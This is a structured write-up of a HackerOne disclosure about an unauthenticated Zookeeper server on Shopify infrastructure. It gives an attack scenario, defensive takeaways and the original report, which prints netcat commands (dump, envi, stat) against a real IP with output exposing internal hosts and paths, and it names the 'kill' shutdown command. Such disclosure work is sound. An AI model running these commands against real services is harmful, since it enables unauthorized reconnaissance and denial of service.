# Unauthorized Access to Zookeeper Instance on Shopify Infrastructure

## Metadata
- **Source:** HackerOne
- **Report:** 154369 | https://hackerone.com/reports/154369
- **Submitted:** 2016-07-27
- **Reporter:** mico02
- **Program:** Shopify
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Missing Authentication, Insecure Default Configuration, Unauthorized Information Disclosure, Unsafe Administrative Command Exposure
- **CVEs:** None
- **Category:** auth-crypto

## Summary
An unauthenticated Zookeeper instance (v3.5.1-alpha) was discovered running on port 2181 of a Shopify EC2 instance with no authentication enabled. The attacker was able to execute administrative commands including dump, envi, stat, and reqs, exposing sensitive cluster information, session data, and internal infrastructure details. Default Zookeeper deployments lack authentication, allowing remote attackers to gather information and potentially disrupt the distributed coordination service.

## Attack scenario
1. Attacker performs port scanning on Shopify infrastructure and identifies port 2181 as open
2. Banner grabbing reveals Zookeeper version 3.5.1-alpha-1693007 running without authentication
3. Attacker connects to the service via TCP port 2181 using netcat or similar tools
4. Attacker executes 'dump' command to enumerate active sessions and ephemeral nodes, revealing internal agent infrastructure (e.g., /borg/locutus/agents paths and IP addresses)
5. Attacker executes 'stat' command to gather performance metrics, client connections, and cluster topology information
6. Attacker could potentially execute 'kill' command to shut down the Zookeeper server, causing denial of service to dependent distributed applications

## Root cause
Zookeeper's default configuration deploys without authentication mechanisms enabled. The service was exposed directly on the internet without network-level access controls (firewall rules, security groups), allowing unauthenticated remote connections to execute administrative commands.

## Attacker mindset
An attacker discovering this service would recognize it as a critical infrastructure component and leverage it for reconnaissance, intelligence gathering on internal topology and running services, and potential disruption through denial of service attacks. The lack of authentication combined with administrative command availability creates a high-impact attack surface.

## Defensive takeaways
- Enable Zookeeper authentication (SASL/Kerberos or custom ACLs) in production deployments
- Implement network segmentation and restrict Zookeeper port 2181 access to only authorized internal clients
- Use security groups and network ACLs to prevent internet-facing exposure of coordination services
- Disable or restrict admin-level commands (dump, kill, envi) if not required for operations
- Implement regular port scanning and service discovery audits to identify unintended exposures
- Apply principle of least privilege to Zookeeper service accounts and connections
- Monitor Zookeeper logs for unauthorized connection attempts and admin command execution

## Variant hunting
Look for other coordination/distributed services without authentication: etcd, Consul, Redis, Memcached, RabbitMQ, Kafka. Scan for common infrastructure ports: 2181 (Zookeeper), 2379-2380 (etcd), 8500 (Consul), 6379 (Redis), 27017 (MongoDB), 9042 (Cassandra). Check for other Shopify infrastructure with default credentials or no authentication on management ports.

## MITRE ATT&CK
- T1190: Exploit Public-Facing Application
- T1046: Network Service Discovery
- T1592: Gather Victim Host Information
- T1526: Enumerate External Targets
- T1040: Traffic Sniffing
- T1078: Valid Accounts (no credentials required)
- T1482: Domain Trust Discovery
- T1057: Process Discovery
- T1007: System Service Discovery

## Notes
This vulnerability represents a classic misconfigurations in infrastructure-as-a-service deployments where security is assumed to be handled at network level but defaults are not hardened. The Zookeeper instance was part of 'locutus' cluster infrastructure at Shopify. The exposure of ephemeral nodes and session tracking information could enable lateral movement attacks and targeted disruption of Shopify's distributed systems. The report demonstrates proper responsible disclosure without executing destructive commands like 'kill'.

## Full report
<details><summary>Expand</summary>

What is Zookeeper?
====================
Zookeeper is a coordination service for distributed applications. It allows common services such as naming, synchronisation, configuration management and group services to be managed by a simple interface and It uses a data model of File System on an operating system.

How does Zookeeper relate to Shopify?
====================
While scanning for Open ports on http://locutus-zk3.ec2.shopify.com, I came across port 2181. Grabbing the banner on this port revealed that it's running Zookeeper:
```
Zookeeper version: 3.5.1-alpha-1693007, built on 07/28/2015 07:19 GMT
```
So you found an open, how does this affect Shopify?
====================
Zookeeper installations does not deploy any authentication by default, this makes it very easy for remote attackers to abuse Zookeeper installations, gather information and cause havoc inside Zookeeper clusters by killing the servers (my tests showed that the kill command is available on this instance). After some testing, I found that I was able to run all the commands that are only allowed to be run by admins! Here is a sample of the commands I ran:

>dump: Lists the outstanding sessions and ephemeral nodes. This only works on the leader.

```
$ echo dump |ncat 52.2.164.229 2181
SessionTracker dump:
Global Sessions(7):
0x1053c5850800023       4000ms
0x1053c5850800024       4000ms
0x2000b1ecdeb0160       4000ms
0x2000b1ecdeb0161       4000ms
0x2000b1ecdeb0162       4000ms
0x3055d0251540008       4000ms
0x3055d0251540009       4000ms
ephemeral nodes dump:
Sessions with Ephemerals (5):
0x1053c5850800024:
        /borg/locutus/agents/061e4b6/10.92.1.192:9257
0x1053c5850800023:
        /borg/locutus/agents/061e4b6/10.92.1.118:9257
0x3055d0251540008:
        /borg/locutus/agents/061e4b6/10.92.1.120:9257
0x2000b1ecdeb0162:
        /borg/locutus/agents/061e4b6/10.92.1.87:9257
0x3055d0251540009:
        /borg/locutus/agents/061e4b6/10.92.1.10:9257
Connections dump:
Connections Sets (2)/(7):
Ncat: An established connection was aborted by the software in your host machine. .
```

>envi: Print details about serving environment.

```
$ echo envi |ncat 52.2.164.229 2181
Environment:
zookeeper.version=3.5.1-alpha-1693007, built on 07/28/2015 07:19 GMT
host.name=locutus-zk3.ec2.shopify.com
java.version=1.7.0_79
java.vendor=Oracle Corporation
java.home=/usr/lib/jvm/java-7-openjdk-amd64/jre
java.class.path=:/etc/zookeeper-locutus:/usr/src/zookeeper-locutus/zookeeper/zookeeper-3.5.1-alpha.jar:/usr/src/zookeeper-locutus/zookeeper/lib/commons-cli-1.2.jar:/usr/src/zookeeper-locutus/zookeeper/lib/jackson-core-asl-1.9.11.jar:/usr/src/zookeeper-locutus/zookeeper/lib/jackson-mapper-asl-1.9.11.jar:/usr/src/zookeeper-locutus/zookeeper/lib/javacc.jar:/usr/src/zookeeper-locutus/zookeeper/lib/jetty-6.1.26.jar:/usr/src/zookeeper-locutus/zookeeper/lib/jetty-util-6.1.26.jar:/usr/src/zookeeper-locutus/zookeeper/lib/jline-0.9.94.jar:/usr/src/zookeeper-locutus/zookeeper/lib/jline-2.11.jar:/usr/src/zookeeper-locutus/zookeeper/lib/log4j-1.2.16.jar:/usr/src/zookeeper-locutus/zookeeper/lib/netty-3.7.0.Final.jar:/usr/src/zookeeper-locutus/zookeeper/lib/servlet-api-2.5-20081211.jar:/usr/src/zookeeper-locutus/zookeeper/lib/slf4j-api-1.6.1.jar:/usr/src/zookeeper-locutus/zookeeper/lib/slf4j-api-1.7.5.jar:/usr/src/zookeeper-locutus/zookeeper/lib/slf4j-log4j12-1.6.1.jar:/usr/src/zookeeper-locutus/zookeeper/lib/slf4j-log4j12-1.7.5.jar
java.library.path=/usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib
java.Ncat: An established connection was aborted by the software in your host machine.
```

>kill: Shuts down the server. (Haven't tried this one)
```
```

>reqs: List outstanding requests.

```
$ echo reqs |ncat 52.2.164.229 2181
close: Result too large
```

>ruok: Tests if server is running in a non-error state. The server will respond with imok if it is running. Otherwise it will not respond at all.
```
$ echo ruok |ncat 52.2.164.229 2181
imok
```

>stat: Lists statistics about performance and connected clients.

```
$ echo stat |ncat 52.2.164.229 2181
Zookeeper version: 3.5.1-alpha-1693007, built on 07/28/2015 07:19 GMT
Clients:
 /10.92.1.120:35986[1](queued=0,recved=2238053,sent=2238053)
 /10.92.1.10:48851[1](queued=0,recved=2235979,sent=2235979)
 /10.92.1.242:54198[1](queued=0,recved=713623,sent=713623)
 /86.136.100.60:11057[0](queued=0,recved=1,sent=0)
 /10.92.1.253:60423[1](queued=0,recved=2204714,sent=2204714)
 /10.92.1.192:47933[1](queued=0,recved=1926008,sent=1926008)
 /10.92.1.118:37256[1](queued=0,recved=129470,sent=129470)

Latency min/avg/max: 0/0/981
Received: 25813570
Sent: 25813622
Connections: 7
Outstanding: 0
Zxid: 0xc2000016ad
Mode: follower
Node count: 192
```

</details>

---
*Analysed by Claude on 2026-05-24*
